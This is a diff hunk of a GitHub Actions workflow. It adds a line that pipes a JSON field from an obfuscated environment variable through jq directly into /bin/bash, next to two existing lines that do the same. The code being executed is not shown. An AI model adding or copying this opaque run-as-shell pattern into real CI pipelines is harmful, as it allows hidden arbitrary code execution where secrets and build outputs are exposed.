@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$ncir2" | jq -r .ta34 | /bin/bash
           printf '%s' "$x132" | jq -r .aghtr82063 | /bin/bash
+          echo $faijw960 | jq -r .u4864 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
